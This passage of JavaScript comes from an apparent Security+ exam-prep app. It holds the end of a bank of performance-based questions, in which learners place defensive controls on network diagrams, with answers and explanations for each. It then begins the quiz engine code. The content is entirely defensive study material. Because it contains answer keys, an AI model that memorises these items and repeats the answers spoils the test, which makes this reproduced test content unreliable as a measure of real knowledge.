      hint: "Admits devices and pins them to a segment.",
      options: ["NAC", "Honeypot", "Reverse proxy", "WAF"],
      answer: 0,
      explain: "NAC authenticates IoT devices and confines them to an isolated VLAN, limiting lateral movement from weak embedded stacks. A honeypot, reverse proxy, and WAF do not perform admission/segmentation."
    },
    {
      label: "Control for position [B]",
      hint: "Governs use of cloud SaaS services.",
      options: ["CASB", "DLP gateway", "Forward proxy", "Load balancer"],
      answer: 0,
      explain: "A Cloud Access Security Broker (CASB) gives visibility and policy enforcement over sanctioned cloud/SaaS telemetry. DLP is broader data control, a forward proxy is generic, and a load balancer distributes load."
    },
    {
      label: "Control for position [C]",
      hint: "A controlled admin pivot host.",
      options: ["Jump server/bastion", "VPN concentrator", "Network TAP", "SIEM collector"],
      answer: 0,
      explain: "A jump server (bastion) is the single hardened, audited hop technicians use to reach building controllers. A VPN concentrator handles tunnels, a TAP mirrors traffic, and a SIEM collector aggregates logs."
    },
    {
      label: "Control for position [D]",
      hint: "Perimeter enforcement at egress.",
      options: ["IDS/IPS", "NGFW", "WAF", "CASB"],
      answer: 1,
      explain: "An NGFW provides inline allow/deny plus application inspection at the internet egress. An IDS/IPS detects/blocks but is not the primary egress policy device here, a WAF protects web apps, and a CASB is cloud-specific."
    }
  ],
  summary: "IoT is admitted and segmented by NAC, cloud telemetry is brokered by a CASB, technicians pivot through a jump server, and egress is enforced by an NGFW."
},
{
  id: "PBQ-139",
  format: 5,
  domain: 3,
  title: "SaaS Provider - Multi-Tenant Front Door",
  brief: "A multi-tenant SaaS provider must scale its tenant web tier, protect it at layer 7, and prevent tenant data exfiltration. Assign controls to each position.",
  exhibitTitle: "SaaS Multi-Tenant Topology",
  exhibit: "<span class='dim'>INTERNET (tenants)</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- terminates TLS, distributes sessions across app pool\n   |\n   v\n[B] <span class='cy'>______</span>  <-- inspects HTTP for app-layer attacks before the app tier\n   |\n   v\n<span class='ok'>Application Servers (multi-tenant)</span>\n   |\n   +--> <span class='hl'>Outbound integrations / data export paths</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- inspects content to stop sensitive-data egress\n   |\n   +--> <span class='dim'>Security telemetry</span>\n            |\n           [D] <span class='cy'>______</span>  <-- consolidates events for the analytics platform",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Distributes incoming sessions and can offload TLS.",
      options: ["Load balancer", "Forward proxy", "Honeypot", "Data diode"],
      answer: 0,
      explain: "A load balancer terminates TLS and distributes tenant sessions across the application pool for scale and availability. A forward proxy serves outbound clients, a honeypot is a decoy, and a data diode is one-way OT."
    },
    {
      label: "Control for position [B]",
      hint: "Layer-7 protection for the web app.",
      options: ["NGFW", "WAF", "NAC", "VPN concentrator"],
      answer: 1,
      explain: "A WAF inspects HTTP/S for OWASP-class attacks before traffic reaches the multi-tenant app tier. An NGFW is broader/lower-layer, NAC handles device admission, and a VPN concentrator terminates tunnels."
    },
    {
      label: "Control for position [C]",
      hint: "Stops sensitive data from leaving.",
      options: ["DLP gateway", "Reverse proxy", "IDS/IPS", "CASB"],
      answer: 0,
      explain: "A DLP gateway inspects outbound content and blocks exfiltration of sensitive tenant data. A reverse proxy fronts servers, an IDS/IPS focuses on threats not data classification, and a CASB targets cloud-app usage rather than this egress path."
    },
    {
      label: "Control for position [D]",
      hint: "Aggregates events for analysis.",
      options: ["SIEM collector", "Load balancer", "WAF", "Jump server"],
      answer: 0,
      explain: "A SIEM collector consolidates security telemetry for the analytics platform. The load balancer, WAF, and jump server perform unrelated traffic/admin functions."
    }
  ],
  summary: "Tenant traffic is balanced by a load balancer, protected by a WAF, guarded against exfiltration by a DLP gateway, and monitored via a SIEM collector."
},
{
  id: "PBQ-140",
  format: 5,
  domain: 3,
  title: "Branch Office - SD-WAN Edge",
  brief: "A retail chain's SD-WAN branch must enforce policy at the edge, give staff cloud-app governance, and admit POS/guest devices safely. Place each control.",
  exhibitTitle: "SD-WAN Branch Topology",
  exhibit: "<span class='dim'>SD-WAN Underlay (Internet + MPLS)</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- inline branch edge: allow/deny + app-ID + threat block\n   |\n   v\n<span class='ok'>Branch LAN</span>\n   |\n   +--> <span class='warnc'>POS terminals + Guest Wi-Fi devices</span>\n   |        |\n   |       [B] <span class='cy'>______</span>  <-- profiles devices, segregates POS from guest\n   |\n   +--> <span class='hl'>Staff using sanctioned/unsanctioned SaaS</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- enforces cloud-app policy + shadow-IT visibility\n   |\n   +--> <span class='dim'>Branch-to-HQ admin access</span>\n            |\n           [D] <span class='cy'>______</span>  <-- terminates the site-to-site encrypted tunnel",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Consolidated inline edge security.",
      options: ["NGFW", "Reverse proxy", "Network TAP", "Honeynet"],
      answer: 0,
      explain: "An NGFW at the branch edge provides allow/deny, application identification, and integrated threat prevention - the standard SD-WAN secure-edge control. A reverse proxy, TAP, and honeynet do not enforce edge policy."
    },
    {
      label: "Control for position [B]",
      hint: "Device profiling and segmentation on the LAN.",
      options: ["NAC", "WAF", "DLP gateway", "VPN concentrator"],
      answer: 0,
      explain: "NAC profiles POS and guest devices and segregates them onto separate segments, isolating cardholder systems from untrusted guests. A WAF, DLP, and VPN concentrator serve different functions."
    },
    {
      label: "Control for position [C]",
      hint: "Cloud-app policy and shadow-IT discovery.",
      options: ["CASB", "Forward proxy", "IDS/IPS", "Load balancer"],
      answer: 0,
      explain: "A CASB enforces sanctioned-vs-unsanctioned cloud policy and surfaces shadow IT. A forward proxy provides generic web filtering, an IDS/IPS targets threats, and a load balancer distributes load."
    },
    {
      label: "Control for position [D]",
      hint: "Site-to-site tunnel termination.",
      options: ["VPN concentrator", "Reverse proxy", "SIEM collector", "WAF"],
      answer: 0,
      explain: "A VPN concentrator terminates the encrypted site-to-site tunnel back to HQ. The reverse proxy, SIEM collector, and WAF are unrelated to tunnel termination."
    }
  ],
  summary: "The branch edge is an NGFW, POS/guest devices are segmented by NAC, cloud usage is governed by a CASB, and the HQ tunnel ends at a VPN concentrator."
},
{
  id: "PBQ-141",
  format: 5,
  domain: 3,
  title: "Water Utility - SCADA Boundary",
  brief: "A municipal water utility must one-way export SCADA historian data, hardening the IT/OT boundary while still admitting field devices. Place each boundary control.",
  exhibitTitle: "Water Utility SCADA Topology",
  exhibit: "<span class='warnc'>OT / SCADA Zone (PLCs, RTUs)</span>\n   |\n   +--> <span class='ok'>Field RTUs joining OT segment</span>\n   |        |\n   |       [A] <span class='cy'>______</span>  <-- authenticates/segments devices onto OT VLAN\n   |\n   v\n<span class='hl'>Historian data must leave OT but nothing may enter</span>\n   |\n  [B] <span class='cy'>______</span>  <-- hardware-enforced one-way export to IT\n   |\n   v\n<span class='dim'>IT / Corporate Zone</span>\n   |\n   +--> <span class='dim'>Vendor remote support sessions</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- single audited hop into the OT DMZ\n   |\n   +--> <span class='dim'>Boundary monitoring</span>\n            |\n           [D] <span class='cy'>______</span>  <-- passive copy of boundary traffic to monitoring",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Admits field devices to the right segment.",
      options: ["NAC", "WAF", "CASB", "Load balancer"],
      answer: 0,
      explain: "NAC authenticates field RTUs and pins them to the OT VLAN, preventing rogue devices on the SCADA segment. A WAF, CASB, and load balancer are not segmentation/admission controls."
    },
    {
      label: "Control for position [B]",
      hint: "Physically enforces one direction of flow.",
      options: ["NGFW", "Data diode/air-gap", "Reverse proxy", "IDS/IPS"],
      answer: 1,
      explain: "A data diode provides hardware-enforced one-way transfer so historian data can leave OT while nothing can flow back in - stronger than a firewall rule. An NGFW, reverse proxy, and IDS/IPS cannot guarantee unidirectional flow."
    },
    {
      label: "Control for position [C]",
      hint: "A controlled, audited entry hop for vendors.",
      options: ["Jump server/bastion", "VPN concentrator", "Honeypot", "DLP gateway"],
      answer: 0,
      explain: "A jump server/bastion is the single hardened, logged hop for vendor remote support into the OT DMZ. A VPN concentrator only terminates tunnels, a honeypot is a decoy, and DLP is data-loss focused."
    },
    {
      label: "Control for position [D]",
      hint: "Passive monitoring copy.",
      options: ["Network TAP", "NGFW", "NAC", "WAF"],
      answer: 0,
      explain: "A network TAP passively copies boundary traffic for monitoring without introducing an inline failure point - important in OT. The NGFW, NAC, and WAF are inline enforcement controls."
    }
  ],
  summary: "Field devices are admitted by NAC, OT exports through a data diode, vendors enter via a jump server, and the boundary is observed through a passive TAP."
},
{
  id: "PBQ-142",
  format: 5,
  domain: 3,
  title: "Zero-Trust Data Center - Microsegmentation",
  brief: "A zero-trust data center must front internal apps, give admins a controlled pivot, and lure attackers away from real workloads. Place each control.",
  exhibitTitle: "Zero-Trust Data Center Topology",
  exhibit: "<span class='dim'>Authenticated Clients</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- fronts internal apps, terminates TLS, hides backends\n   |\n   v\n<span class='ok'>Microsegmented Workloads</span>\n   |\n   +--> <span class='warnc'>Admin plane access</span>\n   |        |\n   |       [B] <span class='cy'>______</span>  <-- only allowed pivot point for privileged sessions\n   |\n   +--> <span class='hl'>Decoy segment to attract/observe attackers</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- intentionally exposed decoy systems\n   |\n   +--> <span class='dim'>East-west visibility</span>\n            |\n           [D] <span class='cy'>______</span>  <-- aggregates flow/event data for analytics",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Server-side gateway that hides backends.",
      options: ["Reverse proxy", "Forward proxy", "NAC", "VPN concentrator"],
      answer: 0,
      explain: "A reverse proxy fronts internal applications, terminates TLS, and conceals backend servers - core to a zero-trust access layer. A forward proxy serves outbound clients, NAC admits devices, and a VPN concentrator terminates tunnels."
    },
    {
      label: "Control for position [B]",
      hint: "Controlled privileged pivot.",
      options: ["Jump server/bastion", "Load balancer", "WAF", "Network TAP"],
      answer: 0,
      explain: "A jump server/bastion is the only sanctioned pivot for privileged admin sessions, enabling logging and MFA enforcement. A load balancer, WAF, and TAP do not gate admin access."
    },
    {
      label: "Control for position [C]",
      hint: "Decoy systems to detect attackers.",
      options: ["Honeypot/honeynet", "DLP gateway", "CASB", "Reverse proxy"],
      answer: 0,
      explain: "A honeypot/honeynet is the decoy segment that attracts and observes attackers away from real workloads. DLP, CASB, and reverse proxy are production controls, not decoys."
    },
    {
      label: "Control for position [D]",
      hint: "Central event/flow aggregation.",
      options: ["SIEM collector", "NGFW", "VPN concentrator", "WAF"],
      answer: 0,
      explain: "A SIEM collector aggregates east-west flow and event data for analytics, central to zero-trust monitoring. The NGFW, VPN concentrator, and WAF are enforcement, not aggregation, controls."
    }
  ],
  summary: "Internal apps sit behind a reverse proxy, admins pivot through a jump server, attackers are diverted to a honeynet, and telemetry feeds a SIEM collector."
},
{
  id: "PBQ-143",
  format: 5,
  domain: 3,
  title: "Trading Firm - Email and Egress Defense",
  brief: "The trading firm now hardens email and outbound paths: filter inbound mail threats, prevent leak of trade data, and route web through policy. Place each control.",
  exhibitTitle: "Trading Firm Email/Egress Topology",
  exhibit: "<span class='dim'>INTERNET</span>\n   |\n   +--> <span class='hl'>Inbound email (phishing/malware risk)</span>\n   |        |\n   |       [A] <span class='cy'>______</span>  <-- filters spam/phishing/malware before mailboxes\n   |\n   +--> <span class='warnc'>Outbound trade/PII data paths</span>\n   |        |\n   |       [B] <span class='cy'>______</span>  <-- inspects content to block sensitive-data egress\n   |\n   +--> <span class='ok'>Analyst web browsing</span>\n            |\n           [C] <span class='cy'>______</span>  <-- policy/filter/cache for outbound web\n               |\n              [D] <span class='cy'>______</span>  <-- inline perimeter enforcement to the internet",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Mail-specific threat filtering.",
      options: ["Email security gateway", "WAF", "Reverse proxy", "NAC"],
      answer: 0,
      explain: "An email security gateway filters spam, phishing, and malware before messages reach mailboxes. A WAF protects web apps, a reverse proxy fronts servers, and NAC handles device admission."
    },
    {
      label: "Control for position [B]",
      hint: "Content inspection to stop leaks.",
      options: ["DLP gateway", "IDS/IPS", "CASB", "Honeypot"],
      answer: 0,
      explain: "A DLP gateway inspects outbound content and blocks egress of trade data and PII. An IDS/IPS targets threats, a CASB governs cloud apps, and a honeypot is a decoy."
    },
    {
      label: "Control for position [C]",
      hint: "Outbound client web mediation.",
      options: ["Forward/web proxy", "Reverse proxy", "WAF", "Load balancer"],
      answer: 0,
      explain: "A forward/web proxy mediates, filters, and caches outbound analyst web traffic. A reverse proxy fronts servers, a WAF protects apps, and a load balancer distributes sessions."
    },
    {
      label: "Control for position [D]",
      hint: "Final inline perimeter device.",
      options: ["NGFW", "Network TAP", "SIEM collector", "Data diode"],
      answer: 0,
      explain: "An NGFW provides the inline perimeter allow/deny and application inspection to the internet. A TAP only mirrors, a SIEM collector aggregates logs, and a data diode is one-way OT."
    }
  ],
  summary: "Inbound mail is cleaned by an email security gateway, leaks are stopped by a DLP gateway, web is filtered by a forward proxy, and the perimeter is an NGFW."
},
{
  id: "PBQ-144",
  format: 5,
  domain: 3,
  title: "University - Public Web and Research DMZ",
  brief: "The university exposes a public web app and a research data portal, scales them, and monitors the DMZ. Place each control.",
  exhibitTitle: "University DMZ Topology",
  exhibit: "<span class='dim'>INTERNET</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- inline boundary allow/deny into the DMZ\n   |\n   v\n[B] <span class='cy'>______</span>  <-- spreads load across public web server farm\n   |\n   v\n<span class='ok'>Public Web + Research Portal (HTTP apps)</span>\n   |    ^\n   |   [C] <span class='cy'>______</span>  <-- blocks SQLi/XSS aimed at the portal\n   |\n   +--> <span class='dim'>DMZ monitoring feed</span>\n            |\n           [D] <span class='cy'>______</span>  <-- passive tap feeding the monitoring stack",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Perimeter enforcement at the DMZ edge.",
      options: ["NGFW", "Reverse proxy", "CASB", "Jump server"],
      answer: 0,
      explain: "An NGFW enforces inline allow/deny at the DMZ boundary. A reverse proxy is an app gateway, a CASB is cloud-specific, and a jump server is an admin pivot."
    },
    {
      label: "Control for position [B]",
      hint: "Distributes traffic to a server farm.",
      options: ["Load balancer", "Forward proxy", "WAF", "Network TAP"],
      answer: 0,
      explain: "A load balancer spreads load across the public web server farm. A forward proxy serves outbound clients, a WAF is app-layer protection, and a TAP only mirrors traffic."
    },
    {
      label: "Control for position [C]",
      hint: "App-layer protection for the portal.",
      options: ["WAF", "IDS/IPS", "DLP gateway", "NAC"],
      answer: 0,
      explain: "A WAF blocks SQLi/XSS and other app-layer attacks aimed at the research portal. A generic IDS/IPS is not app-tuned, DLP is data-loss focused, and NAC is device admission."
    },
    {
      label: "Control for position [D]",
      hint: "Passive monitoring copy.",
      options: ["Network TAP", "VPN concentrator", "Honeypot", "WAF"],
      answer: 0,
      explain: "A network TAP passively copies DMZ traffic to the monitoring stack. A VPN concentrator, honeypot, and WAF serve different functions."
    }
  ],
  summary: "The DMZ edge is an NGFW, the web farm is fronted by a load balancer, the portal is protected by a WAF, and monitoring is fed by a TAP."
},
{
  id: "PBQ-145",
  format: 5,
  domain: 3,
  title: "Smart Building - Tenant Energy Portal",
  brief: "The smart-building operator exposes a tenant energy portal, protects it, and routes building staff web through policy. Place each control.",
  exhibitTitle: "Smart Building Portal Topology",
  exhibit: "<span class='dim'>INTERNET (tenants)</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- fronts the portal, hides app servers, terminates TLS\n   |\n   v\n[B] <span class='cy'>______</span>  <-- inspects HTTP for app-layer attacks\n   |\n   v\n<span class='ok'>Energy Portal App Servers</span>\n   |\n   +--> <span class='warnc'>Building staff outbound web</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- filters/caches outbound staff browsing\n   |\n   +--> <span class='hl'>Cloud analytics export</span>\n            |\n           [D] <span class='cy'>______</span>  <-- governs sanctioned cloud-service usage",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Server-side gateway hiding backends.",
      options: ["Reverse proxy", "Forward proxy", "NGFW", "NAC"],
      answer: 0,
      explain: "A reverse proxy fronts the tenant portal, terminates TLS, and hides the app servers. A forward proxy serves outbound clients, an NGFW is perimeter enforcement, and NAC is device admission."
    },
    {
      label: "Control for position [B]",
      hint: "Layer-7 web app protection.",
      options: ["WAF", "IDS/IPS", "DLP gateway", "Load balancer"],
      answer: 0,
      explain: "A WAF inspects HTTP for SQLi/XSS before the portal app tier. A generic IDS/IPS is not app-tuned, DLP is data-loss focused, and a load balancer distributes sessions."
    },
    {
      label: "Control for position [C]",
      hint: "Outbound client web filtering.",
      options: ["Forward/web proxy", "Reverse proxy", "WAF", "Honeypot"],
      answer: 0,
      explain: "A forward/web proxy filters and caches building-staff outbound browsing. A reverse proxy fronts servers, a WAF protects apps, and a honeypot is a decoy."
    },
    {
      label: "Control for position [D]",
      hint: "Cloud-service governance.",
      options: ["CASB", "SIEM collector", "VPN concentrator", "Data diode"],
      answer: 0,
      explain: "A CASB governs sanctioned cloud-service usage for the analytics export. A SIEM collector aggregates logs, a VPN concentrator terminates tunnels, and a data diode is one-way OT."
    }
  ],
  summary: "The portal sits behind a reverse proxy and a WAF, staff browsing goes through a forward proxy, and cloud export is governed by a CASB."
},
{
  id: "PBQ-146",
  format: 5,
  domain: 3,
  title: "SaaS Provider - Admin and Decoy Plane",
  brief: "The SaaS provider hardens admin access, sets a decoy to detect intrusion, governs developer cloud tools, and gives engineers secure remote access. Place each control.",
  exhibitTitle: "SaaS Admin/Decoy Topology",
  exhibit: "<span class='dim'>Engineers (remote)</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- terminates encrypted remote-access tunnels\n   |\n   v\n<span class='ok'>Management Network</span>\n   |\n   +--> <span class='warnc'>Privileged access to production</span>\n   |        |\n   |       [B] <span class='cy'>______</span>  <-- audited single pivot for admin sessions\n   |\n   +--> <span class='hl'>Unused subnet wired to detect intruders</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- decoy hosts/network to catch lateral movement\n   |\n   +--> <span class='dim'>Developer cloud tooling</span>\n            |\n           [D] <span class='cy'>______</span>  <-- visibility/policy over cloud-app usage",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Remote-access tunnel termination.",
      options: ["VPN concentrator", "Reverse proxy", "Load balancer", "WAF"],
      answer: 0,
      explain: "A VPN concentrator terminates engineers' encrypted remote-access tunnels into the management network. A reverse proxy, load balancer, and WAF are application-tier controls."
    },
    {
      label: "Control for position [B]",
      hint: "Controlled admin pivot.",
      options: ["Jump server/bastion", "NAC", "Forward proxy", "Network TAP"],
      answer: 0,
      explain: "A jump server/bastion is the single audited pivot for privileged production access. NAC admits devices, a forward proxy filters web, and a TAP mirrors traffic."
    },
    {
      label: "Control for position [C]",
      hint: "Decoy to catch lateral movement.",
      options: ["Honeypot/honeynet", "DLP gateway", "CASB", "IDS/IPS"],
      answer: 0,
      explain: "A honeypot/honeynet placed on an unused subnet detects intruders moving laterally - any contact is suspicious. DLP, CASB, and IDS/IPS are production controls, not decoys."
    },
    {
      label: "Control for position [D]",
      hint: "Cloud-app visibility and policy.",
      options: ["CASB", "SIEM collector", "Reverse proxy", "VPN concentrator"],
      answer: 0,
      explain: "A CASB provides visibility and policy over developer cloud tooling. A SIEM collector aggregates logs, a reverse proxy fronts servers, and a VPN concentrator terminates tunnels."
    }
  ],
  summary: "Engineers connect via a VPN concentrator, admins pivot through a jump server, a honeynet catches intruders, and cloud tooling is governed by a CASB."
},
{
  id: "PBQ-147",
  format: 5,
  domain: 3,
  title: "Branch Office - HQ Data Center Ingress",
  brief: "At HQ, the retail chain receives branch and internet traffic to its data-center apps: it must enforce the edge, scale the app tier, protect it, and monitor.",
  exhibitTitle: "HQ Data Center Ingress Topology",
  exhibit: "<span class='dim'>Branches + INTERNET</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- inline edge: allow/deny + app inspection\n   |\n   v\n[B] <span class='cy'>______</span>  <-- distributes sessions across app servers\n   |\n   v\n<span class='ok'>Inventory/Ordering Web Apps</span>\n   |    ^\n   |   [C] <span class='cy'>______</span>  <-- app-layer attack filtering for the web apps\n   |\n   +--> <span class='dim'>Security telemetry</span>\n            |\n           [D] <span class='cy'>______</span>  <-- aggregates events to the analytics platform",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Inline edge enforcement.",
      options: ["NGFW", "Honeypot", "Reverse proxy", "Data diode"],
      answer: 0,
      explain: "An NGFW enforces inline allow/deny with application inspection at the HQ edge. A honeypot is a decoy, a reverse proxy is an app gateway, and a data diode is one-way OT."
    },
    {
      label: "Control for position [B]",
      hint: "Session distribution across servers.",
      options: ["Load balancer", "Forward proxy", "NAC", "VPN concentrator"],
      answer: 0,
      explain: "A load balancer distributes sessions across the inventory/ordering app servers. A forward proxy serves outbound clients, NAC admits devices, and a VPN concentrator terminates tunnels."
    },
    {
      label: "Control for position [C]",
      hint: "Layer-7 protection.",
      options: ["WAF", "IDS/IPS", "DLP gateway", "CASB"],
      answer: 0,
      explain: "A WAF filters app-layer attacks against the web apps. A generic IDS/IPS is not app-tuned, DLP is data-loss focused, and a CASB governs cloud usage."
    },
    {
      label: "Control for position [D]",
      hint: "Event aggregation.",
      options: ["SIEM collector", "Network TAP", "Reverse proxy", "WAF"],
      answer: 0,
      explain: "A SIEM collector aggregates security telemetry to the analytics platform. A TAP only mirrors traffic, while the reverse proxy and WAF are app-tier controls."
    }
  ],
  summary: "The HQ edge is an NGFW, the app tier is fronted by a load balancer and a WAF, and events flow to a SIEM collector."
},
{
  id: "PBQ-148",
  format: 5,
  domain: 3,
  title: "Water Utility - Corporate IT Edge",
  brief: "The water utility's corporate IT side must filter inbound mail, enforce the perimeter, route staff web, and admit office devices - kept entirely separate from OT.",
  exhibitTitle: "Water Utility Corporate IT Topology",
  exhibit: "<span class='dim'>INTERNET</span>\n   |\n   +--> <span class='hl'>Inbound corporate email</span>\n   |        |\n   |       [A] <span class='cy'>______</span>  <-- filters phishing/malware before mailboxes\n   |\n   v\n[B] <span class='cy'>______</span>  <-- inline perimeter allow/deny + app inspection\n   |\n   v\n<span class='ok'>Corporate LAN</span>\n   |\n   +--> <span class='warnc'>Staff outbound browsing</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- filters/caches outbound web\n   |\n   +--> <span class='dim'>Office devices onboarding</span>\n            |\n           [D] <span class='cy'>______</span>  <-- posture + VLAN assignment for devices",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Mail threat filtering.",
      options: ["Email security gateway", "WAF", "DLP gateway", "Reverse proxy"],
      answer: 0,
      explain: "An email security gateway filters phishing and malware before corporate mailboxes. A WAF protects web apps, DLP focuses on egress, and a reverse proxy fronts servers."
    },
    {
      label: "Control for position [B]",
      hint: "Perimeter enforcement.",
      options: ["NGFW", "Load balancer", "Honeypot", "Network TAP"],
      answer: 0,
      explain: "An NGFW enforces inline perimeter allow/deny with app inspection. A load balancer distributes load, a honeypot is a decoy, and a TAP only mirrors traffic."
    },
    {
      label: "Control for position [C]",
      hint: "Outbound web filtering.",
      options: ["Forward/web proxy", "Reverse proxy", "CASB", "WAF"],
      answer: 0,
      explain: "A forward/web proxy filters and caches staff outbound browsing. A reverse proxy fronts servers, a CASB targets cloud apps, and a WAF protects web apps."
    },
    {
      label: "Control for position [D]",
      hint: "Device posture and segmentation.",
      options: ["NAC", "VPN concentrator", "DLP gateway", "SIEM collector"],
      answer: 0,
      explain: "NAC posture-checks office devices and assigns VLANs on admission. A VPN concentrator terminates tunnels, DLP is data-loss focused, and a SIEM collector aggregates logs."
    }
  ],
  summary: "Corporate mail is filtered by an email security gateway, the perimeter is an NGFW, staff web goes through a forward proxy, and devices are admitted by NAC."
},
{
  id: "PBQ-149",
  format: 5,
  domain: 3,
  title: "Zero-Trust Data Center - North-South Ingress",
  brief: "The zero-trust data center hardens north-south ingress: enforce the edge, scale and protect apps, and observe ingress passively. Place each control.",
  exhibitTitle: "Zero-Trust North-South Topology",
  exhibit: "<span class='dim'>Authenticated External Clients</span>\n   |\n   v\n[A] <span class='cy'>______</span>  <-- inline boundary allow/deny + threat prevention\n   |\n   v\n[B] <span class='cy'>______</span>  <-- distributes traffic across app instances\n   |\n   v\n[C] <span class='cy'>______</span>  <-- app-layer inspection before microservices\n   |\n   v\n<span class='ok'>Microservice Workloads</span>\n   |\n   +--> <span class='dim'>Ingress visibility</span>\n            |\n           [D] <span class='cy'>______</span>  <-- passive copy of ingress traffic to sensors",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Inline boundary enforcement.",
      options: ["NGFW", "Reverse proxy", "Honeypot", "VPN concentrator"],
      answer: 0,
      explain: "An NGFW enforces inline boundary allow/deny with integrated threat prevention. A reverse proxy is an app gateway, a honeypot is a decoy, and a VPN concentrator terminates tunnels."
    },
    {
      label: "Control for position [B]",
      hint: "Traffic distribution.",
      options: ["Load balancer", "Forward proxy", "NAC", "DLP gateway"],
      answer: 0,
      explain: "A load balancer distributes north-south traffic across app instances. A forward proxy serves outbound clients, NAC admits devices, and DLP is data-loss focused."
    },
    {
      label: "Control for position [C]",
      hint: "App-layer inspection.",
      options: ["WAF", "IDS/IPS", "CASB", "Jump server"],
      answer: 0,
      explain: "A WAF performs app-layer inspection before reaching the microservices. A generic IDS/IPS is not app-tuned, a CASB governs cloud apps, and a jump server is an admin pivot."
    },
    {
      label: "Control for position [D]",
      hint: "Passive monitoring copy.",
      options: ["Network TAP", "SIEM collector", "NGFW", "WAF"],
      answer: 0,
      explain: "A network TAP passively copies ingress traffic to detection sensors without sitting inline. A SIEM collector aggregates logs after the fact, and the NGFW/WAF are inline enforcement."
    }
  ],
  summary: "North-south ingress is enforced by an NGFW, scaled by a load balancer, protected by a WAF, and observed passively through a TAP."
},
{
  id: "PBQ-150",
  format: 5,
  domain: 3,
  title: "Smart Building - OT/IT Convergence Boundary",
  brief: "The smart building converges OT building-automation with IT: one-way export of OT data, an inline IT/OT firewall, a vendor pivot, and passive OT monitoring.",
  exhibitTitle: "Smart Building OT/IT Boundary Topology",
  exhibit: "<span class='warnc'>OT Building-Automation Zone (BACnet/Modbus)</span>\n   |\n   +--> <span class='hl'>OT metrics must export to IT, no return path</span>\n   |        |\n   |       [A] <span class='cy'>______</span>  <-- hardware one-way export to IT analytics\n   |\n   v\n[B] <span class='cy'>______</span>  <-- inline IT/OT boundary allow/deny + app-ID\n   |\n   v\n<span class='ok'>IT Building-Management Servers</span>\n   |\n   +--> <span class='dim'>Vendor maintenance access</span>\n   |        |\n   |       [C] <span class='cy'>______</span>  <-- single audited hop to OT controllers\n   |\n   +--> <span class='dim'>OT boundary monitoring</span>\n            |\n           [D] <span class='cy'>______</span>  <-- passive copy of OT-side traffic to sensors",
  fields: [
    {
      label: "Control for position [A]",
      hint: "Hardware-enforced one-way flow.",
      options: ["Data diode/air-gap", "NGFW", "Reverse proxy", "Load balancer"],
      answer: 0,
      explain: "A data diode provides hardware-enforced one-way export of OT metrics with no return path - stronger than a firewall rule. An NGFW, reverse proxy, and load balancer cannot guarantee unidirectional flow."
    },
    {
      label: "Control for position [B]",
      hint: "Inline IT/OT boundary enforcement.",
      options: ["NGFW", "Honeypot", "VPN concentrator", "Network TAP"],
      answer: 0,
      explain: "An NGFW enforces inline IT/OT boundary allow/deny with application identity. A honeypot is a decoy, a VPN concentrator terminates tunnels, and a TAP only mirrors traffic."
    },
    {
      label: "Control for position [C]",
      hint: "Controlled vendor pivot.",
      options: ["Jump server/bastion", "CASB", "DLP gateway", "WAF"],
      answer: 0,
      explain: "A jump server/bastion is the single audited hop vendors use to reach OT controllers. A CASB governs cloud apps, DLP is data-loss focused, and a WAF protects web apps."
    },
    {
      label: "Control for position [D]",
      hint: "Passive OT monitoring.",
      options: ["Network TAP", "NAC", "SIEM collector", "Reverse proxy"],
      answer: 0,
      explain: "A network TAP passively copies OT-side traffic to sensors without an inline failure point - preferred in OT. NAC is admission, a SIEM collector aggregates logs, and a reverse proxy is an app gateway."
    }
  ],
  summary: "OT data exports through a data diode, the IT/OT boundary is an NGFW, vendors pivot through a jump server, and OT traffic is observed via a passive TAP."
}
);
/* ============================================================================
   security+  ::  quizEngine.js  —  ENGINE  (assessment + PBQ runtime)
   This block is appended after the question bank and PBQ database above.
   It powers three assessment modes (domain quiz, quick quiz, timed mock) plus
   the performance-based-question simulator, rendering each into the shared
   #view container via window.APP.
   ========================================================================== */
(function () {
  "use strict";

  var S = window.SECPLUS;
  /* app.js loads AFTER this file, so window.APP isn't ready at load time.
     Resolve it lazily: every public entry point calls ready() first, which
     binds A and el before any rendering helper runs. */
  var A, el;
  function ready() { A = window.APP; el = A.el; }

  /* ----- sampling helpers (Fisher–Yates) ----- */
  function shuffle(arr) {
    var a = arr.slice();
    for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; }
    return a;
  }
  function sample(arr, n) { return shuffle(arr).slice(0, n); }
  function byDomain(d) { return S.questions.filter(function (q) { return q.domain === d; }); }
  var LETTERS = ["A", "B", "C", "D", "E", "F"];

  /* per-question option order is randomized so the answer index isn't a tell. */
  function prepare(q) {
    var order = shuffle(q.options.map(function (o, i) { return i; }));
    return {
      ref: q,
      opts: order.map(function (i) { return q.options[i]; }),
      answer: order.indexOf(q.answer)
    };
  }

  /* domain stats accumulator used by results + analytics */
  function blankStats() { var o = {}; (S.domainMeta || []).forEach(function (d) { o[d.id] = { correct: 0, total: 0 }; }); return o; }

  /* ===========================================================================
     ADAPTIVE / MISSED-QUESTION TRACKING
     Persists two things across every quiz/mock session (localStorage via APP):
       secplus.objstats.v1 = { "1.2": {c, n}, ... }   per-objective accuracy
